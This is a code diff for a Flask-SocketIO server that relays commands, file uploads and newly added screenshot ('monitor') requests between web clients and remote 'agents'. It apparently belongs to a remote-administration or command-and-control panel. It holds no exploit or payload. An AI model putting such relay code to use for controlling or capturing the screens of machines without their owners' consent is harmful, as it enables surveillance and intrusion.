@@ -2,6 +2,7 @@ import base64
 import os
 import requests
 from datetime import datetime
+import time
 
 from flask import json, request, current_app, url_for, Blueprint
 from flask_socketio import join_room, emit
@@ -22,7 +23,8 @@ def web_connect():
 # 接收 web 客户端加入事件
 @socketio.on('joined', namespace='/web')
 def joined(message_body):
-    print('有新客户端连接：' + message_body['agent_id'])
+    if message_body:
+        print('有新客户端连接：' + message_body['agent_id'])
     room = message_body['agent_id']
     join_room(room)
     emit('status', {'msg': str(message_body['agent_id']) + ' has entered the room.'}, room=room)
@@ -71,7 +73,7 @@ def hello(message_body):
 
 # 接收 web 客户端 command 事件
 @socketio.on('command', namespace='/web')
-def get_command(message_body):
+def web_command(message_body):
     print('client agent id：' + message_body['agent_id'])
     print('client agent command：' + message_body['command'])
     cmd = message_body['command']
@@ -125,3 +127,20 @@ def upload(message_body):
     download_link = url_for('agent.uploads', path=agent_dir + '/' + filename)
     output = '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
     emit('upload', output, namespace='/web', room=agent_id)
+
+
+@socketio.on('monitor', namespace='/web')
+def web_monitor(message_body):
+    print('截图请求：' + message_body['room'])
+    room = message_body['room']
+    emit('monitor', {
+            'room': room
+        }, namespace='/api', room=room)
+    time.sleep(1)
+
+
+@socketio.on('monitor', namespace='/api')
+def api_monitor(message_body):
+    # data = base64.b64decode(message_body['data'])
+    print(message_body['data'])
+    emit('monitor', message_body['data'], namespace='/web', room=message_body['room'])
